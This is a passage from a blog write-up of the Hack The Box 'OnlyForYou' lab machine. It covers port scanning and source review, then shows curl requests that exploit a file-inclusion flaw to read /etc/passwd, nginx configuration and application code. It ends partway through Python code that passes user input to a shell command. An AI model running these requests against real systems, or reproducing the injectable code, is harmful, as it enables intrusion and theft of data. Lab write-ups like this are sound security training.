<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="medium - OnlyForYou User Flag Nmap scanning Interesting finding, many filtered ports, probably open internally only:
z➤ sudo nmap -n -Pn -sV -O -T4 onlyforyou.htb Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 08:35 -04 Nmap scan report for onlyforyou.htb (10.10.11.210) Host is up (0.13s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="medium - OnlyForYou User Flag Nmap scanning Interesting finding, many filtered ports, probably open internally only:
z➤ sudo nmap -n -Pn -sV -O -T4 onlyforyou.htb Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 08:35 -04 Nmap scan report for onlyforyou.htb (10.10.11.210) Host is up (0.13s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1."><meta property="og:title" content><meta property="og:description" content="medium - OnlyForYou User Flag Nmap scanning Interesting finding, many filtered ports, probably open internally only:
z➤ sudo nmap -n -Pn -sV -O -T4 onlyforyou.htb Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 08:35 -04 Nmap scan report for onlyforyou.htb (10.10.11.210) Host is up (0.13s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/medium/onlyforyou/"><meta property="article:section" content="infosec"><title>medium - OnlyForYou </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/medium/onlyforyou/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=medium---onlyforyou>medium - OnlyForYou
<a class=heading-link href=#medium---onlyforyou><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User Flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><h3 id=nmap-scanning>Nmap scanning
<a class=heading-link href=#nmap-scanning><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Interesting finding, many filtered ports, probably open internally only:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ sudo nmap -n -Pn -sV -O -T4 onlyforyou.htb
</span></span><span style=display:flex><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 08:35 -04
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#fb660a;font-weight:700>for</span> onlyforyou.htb (10.10.11.210)
</span></span><span style=display:flex><span>Host is up (0.13s latency).
</span></span><span style=display:flex><span>Not shown: <span style=color:#0086f7;font-weight:700>988</span> closed tcp ports (reset)
</span></span><span style=display:flex><span>PORT      STATE    SERVICE      VERSION
</span></span><span style=display:flex><span>22/tcp    open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>80/tcp    open     http         nginx 1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>1234/tcp  filtered hotline
</span></span><span style=display:flex><span>1494/tcp  filtered citrix-ica
</span></span><span style=display:flex><span>2381/tcp  filtered compaq-https
</span></span><span style=display:flex><span>4446/tcp  filtered n1-fwp
</span></span><span style=display:flex><span>5862/tcp  filtered unknown
</span></span><span style=display:flex><span>7435/tcp  filtered unknown
</span></span><span style=display:flex><span>10243/tcp filtered unknown
</span></span><span style=display:flex><span>10629/tcp filtered unknown
</span></span><span style=display:flex><span>11111/tcp filtered vce
</span></span><span style=display:flex><span>17877/tcp filtered unknown
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#fb660a;font-weight:700>for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</span></span><span style=display:flex><span>TCP/IP fingerprint:
</span></span><span style=display:flex><span>OS:SCAN(<span style=color:#fb660a>V</span>=7.94%E=4%D=8/11%OT=22%CT=1%CU=41064%PV=Y%DS=2%DC=I%G=Y%TM=64D62B3
</span></span><span style=display:flex><span>OS:5%P=x86_64-pc-linux-gnu)SEQ(<span style=color:#fb660a>SP</span>=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
</span></span><span style=display:flex><span>OS:(<span style=color:#fb660a>O1</span>=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
</span></span><span style=display:flex><span>OS:1NW7%O6=M53CST11)WIN(<span style=color:#fb660a>W1</span>=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
</span></span><span style=display:flex><span>OS:(<span style=color:#fb660a>R</span>=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(<span style=color:#fb660a>R</span>=Y%DF=Y%T=40%S=O%A=S+%F=A
</span></span><span style=display:flex><span>OS:S%RD=0%Q=)T2(<span style=color:#fb660a>R</span>=N)T3(<span style=color:#fb660a>R</span>=N)T4(<span style=color:#fb660a>R</span>=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
</span></span><span style=display:flex><span>OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(<span style=color:#fb660a>R</span>=Y%DF=Y%T=40%W=0%S=A%A=Z%F
</span></span><span style=display:flex><span>OS:=R%O=%RD=0%Q=)T7(<span style=color:#fb660a>R</span>=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(<span style=color:#fb660a>R</span>=Y%DF=N%
</span></span><span style=display:flex><span>OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(<span style=color:#fb660a>R</span>=Y%DFI=N%T=40%CD
</span></span><span style=display:flex><span>OS:=S)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#0086f7;font-weight:700>2</span> hops
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#fb660a;font-weight:700>done</span>: <span style=color:#0086f7;font-weight:700>1</span> IP address (<span style=color:#0086f7;font-weight:700>1</span> host up) scanned in 22.36 seconds
</span></span></code></pre></div><h3 id=web-recognition>Web recognition
<a class=heading-link href=#web-recognition><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Here we go, we another redirection and we have to add only4you.htb to <code>/etc/hosts</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -I -L onlyforyou.htb
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>301</span> Moved Permanently
</span></span><span style=display:flex><span>Server: nginx/1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>Date: Fri, <span style=color:#0086f7;font-weight:700>11</span> Aug <span style=color:#0086f7;font-weight:700>2023</span> 12:37:52 GMT
</span></span><span style=display:flex><span>Content-Type: text/html
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>178</span>
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>Location: http://only4you.htb/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>curl: (6) Could not resolve host: only4you.htb
</span></span></code></pre></div><p>Regular web page at a first glance:<figure class=image-container><a href=/i/2023-08-11_08-38.png><img width=100% src=/i/2023-08-11_08-38.png alt="initial web page"></a><figcaption>&#8213; initial web page &#8213;</figcaption></figure></p><p>Ok, so inspecting a little bit the html source code, I found this
<a href=http://beta.only4you.htb>http://beta.only4you.htb</a>
:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -s -L only4you.htb  | ag href | sort -u
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>  &lt;link <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;../static/vendor/glightbox/css/glightbox.min.css&#34;</span> <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;link <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;../static/vendor/remixicon/remixicon.css&#34;</span> <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;link <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;../static/vendor/swiper/swiper-bundle.min.css&#34;</span> <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span>&gt;
</span></span><span style=display:flex><span>                  We have some beta products to test. You can check it &lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;http://beta.only4you.htb&#34;</span>&gt;here&lt;/a&gt;
</span></span></code></pre></div><p>And now we have something:<figure class=image-container><a href=/i/2023-08-11_08-47.png><img width=100% src=/i/2023-08-11_08-47.png alt="initial web page"></a><figcaption>&#8213; initial web page &#8213;</figcaption></figure></p><p>Ok, now we have some pages to have some fun:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -s -L beta.only4you.htb | ag href
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>&lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/resize&#34;</span>&gt;resize&lt;/a&gt;
</span></span><span style=display:flex><span>&lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/convert&#34;</span>&gt;convert&lt;/a&gt;
</span></span><span style=display:flex><span>&lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/source&#34;</span> <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;btn btn-primary my-2&#34;</span>&gt;Source Code&lt;/a&gt;
</span></span></code></pre></div><p>I&rsquo;m downloading the source code, I reviewied <code>/convert</code> and <code>/resize</code> html source code, nothing interesting.<figure class=image-container><a href=/i/2023-08-11_08-53.png><img width=100% src=/i/2023-08-11_08-53.png alt></a></figure></p><p>Ok, there are these two .py files:</p><ul><li>app.py contains a Flask service with multiple routing http endpoints</li><li>tool.py converts and resizes an image file</li></ul><p>We started wrong here, check these app.py and too.py image validations by filename extension instead of metadata header file:<figure class=image-container><a href=/i/2023-08-11_09-03.png><img width=100% src=/i/2023-08-11_09-03.png alt></a></figure><figure class=image-container><a href=/i/2023-08-11_09-06.png><img width=100% src=/i/2023-08-11_09-06.png alt></a></figure></p><p>Notice these libs are being used and might be vulnerables somehow:</p><ul><li><code>from PIL import Image</code></li><li><code>from werkzeug.utils import secure_filename</code></li></ul><h3 id=exploiting-download-http-endpoint>Exploiting <code>/download</code> http endpoint
<a class=heading-link href=#exploiting-download-http-endpoint><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Let&rsquo;s exploit this url endpoint.</p><p>So after uploading an image to be resized I got multiple images to download:</p><figure class=image-container><a href=/i/2023-08-16_20-46.png><img width=100% src=/i/2023-08-16_20-46.png alt="Multiple files to download"></a><figcaption>&#8213; Multiple files to download &#8213;</figcaption></figure><p>By using Burpsuite (I used to hate this tool) I found that this <code>/download</code> http path has an LFI vuln, the <code>image=</code> parameter can be modified and we can download files from the server, you also saw the previous <code>app.py</code> python file was just validating the user don&rsquo;t send anything starting with <code>..</code> and <code>../</code>, but not something like <code>/etc/passwd</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl -i -s -k -X <span style=color:#0086d2>$&#39;POST&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Host: beta.only4you.htb&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Accept-Language: en-US,en;q=0.5&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Accept-Encoding: gzip, deflate&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Content-Length: 17&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Origin: http://beta.only4you.htb&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Connection: close&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Referer: http://beta.only4you.htb/list&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Sec-GPC: 1&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  --data-binary <span style=color:#0086d2>$&#39;image=/etc/passwd&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  <span style=color:#0086d2>$&#39;http://beta.only4you.htb/download&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Server: nginx/1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>Date: Thu, <span style=color:#0086f7;font-weight:700>17</span> Aug <span style=color:#0086f7;font-weight:700>2023</span> 01:00:20 GMT
</span></span><span style=display:flex><span>Content-Type: application/octet-stream
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>2079</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content-Disposition: attachment; <span style=color:#fb660a>filename</span>=passwd
</span></span><span style=display:flex><span>Last-Modified: Thu, <span style=color:#0086f7;font-weight:700>30</span> Mar <span style=color:#0086f7;font-weight:700>2023</span> 12:12:20 GMT
</span></span><span style=display:flex><span>Cache-Control: no-cache
</span></span><span style=display:flex><span>ETag: <span style=color:#0086d2>&#34;1680178340.2049809-2079-393413677&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>john:x:1000:1000:john:/home/john:/bin/bash
</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style=display:flex><span>mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>neo4j:x:997:997::/var/lib/neo4j:/bin/bash
</span></span><span style=display:flex><span>dev:x:1001:1001::/home/dev:/bin/bash
</span></span><span style=display:flex><span>fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>_laurel:x:996:996::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>Ok, we&rsquo;ve got some names from that like <code>john</code> and <code>dev</code>.</p><p>Here we see, we have both vhosts on nginx, notice the path <code>/var/www/beta.only4you.htb</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s -k -X <span style=color:#0086d2>$&#39;POST&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Host: beta.only4you.htb&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Accept-Language: en-US,en;q=0.5&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Accept-Encoding: gzip, deflate&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Origin: http://beta.only4you.htb&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Connection: close&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Referer: http://beta.only4you.htb/list&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Sec-GPC: 1&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  --data-binary <span style=color:#0086d2>$&#39;image=/etc/nginx/sites-enabled/default&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  <span style=color:#0086d2>$&#39;http://beta.only4you.htb/download&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server {
</span></span><span style=display:flex><span>    listen 80;
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>301</span> http://only4you.htb<span style=color:#fb660a>$request_uri</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server {
</span></span><span style=display:flex><span>        listen 80;
</span></span><span style=display:flex><span>        server_name only4you.htb;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        location / {
</span></span><span style=display:flex><span>                include proxy_params;
</span></span><span style=display:flex><span>                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server {
</span></span><span style=display:flex><span>        listen 80;
</span></span><span style=display:flex><span>        server_name beta.only4you.htb;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        location / {
</span></span><span style=display:flex><span>                include proxy_params;
</span></span><span style=display:flex><span>                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>I&rsquo;m able to read only4you.htb py files:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s -k -X <span style=color:#0086d2>$&#39;POST&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>$&#39;Host: beta.only4you.htb&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  ...
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>  --data-binary <span style=color:#0086d2>$&#39;image=/var/www/only4you.htb/app.py&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  <span style=color:#0086d2>$&#39;http://beta.only4you.htb/download&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>from flask import Flask, render_template, request, flash, redirect
</span></span><span style=display:flex><span>from form import sendmessage
</span></span><span style=display:flex><span>import uuid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@app.route(<span style=color:#0086d2>&#39;/&#39;</span>, <span style=color:#fb660a>methods</span>=[<span style=color:#0086d2>&#39;GET&#39;</span>, <span style=color:#0086d2>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span>def index():
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span> request.method == <span style=color:#0086d2>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#fb660a>email</span> = request.form[<span style=color:#0086d2>&#39;email&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#fb660a>subject</span> = request.form[<span style=color:#0086d2>&#39;subject&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#fb660a>message</span> = request.form[<span style=color:#0086d2>&#39;message&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#fb660a>ip</span> = request.remote_addr
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a>status</span> = sendmessage(email, subject, message, ip)
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#fb660a>status</span> == 0:
</span></span><span style=display:flex><span>            flash(<span style=color:#0086d2>&#39;Something went wrong!&#39;</span>, <span style=color:#0086d2>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>elif</span> <span style=color:#fb660a>status</span> == 1:
</span></span><span style=display:flex><span>            flash(<span style=color:#0086d2>&#39;You are not authorized!&#39;</span>, <span style=color:#0086d2>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>            flash(<span style=color:#0086d2>&#39;Your message was successfuly sent! We will reply as soon as possible.&#39;</span>, <span style=color:#0086d2>&#39;success&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>return</span> redirect(<span style=color:#0086d2>&#39;/#contact&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>return</span> render_template(<span style=color:#0086d2>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span> <span style=color:#fb660a>__name__</span> == <span style=color:#0086d2>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app.run(<span style=color:#fb660a>host</span>=<span style=color:#0086d2>&#39;127.0.0.1&#39;</span>, <span style=color:#fb660a>port</span>=80, <span style=color:#fb660a>debug</span>=False)
</span></span></code></pre></div><p>Notice that <code>form</code> py library, let&rsquo;s read the code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> smtplib, re
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> email.message <span style=color:#fb660a;font-weight:700>import</span> EmailMessage
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> subprocess <span style=color:#fb660a;font-weight:700>import</span> PIPE, run
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> ipaddress
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>issecure</span>(email, ip):
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span> not re.<span style=color:#fb660a;font-weight:700>match</span>(<span style=color:#0086d2>&#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})&#34;</span>, email):
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                domain = email.split(<span style=color:#0086d2>&#34;@&#34;</span>, <span style=color:#0086f7;font-weight:700>1</span>)[<span style=color:#0086f7;font-weight:700>1</span>]
</span></span><span style=display:flex><span>                result = run([<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;dig txt </span><span style=color:#0086d2>{</span>domain<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>], shell=<span style=color:#fb660a;font-weight:700>True</span>, stdout=PIPE)
</span></span><span style=display:flex><span>                output = result.stdout.decode(<span style=color:#0086d2>&#39;utf-8&#39;</span>)
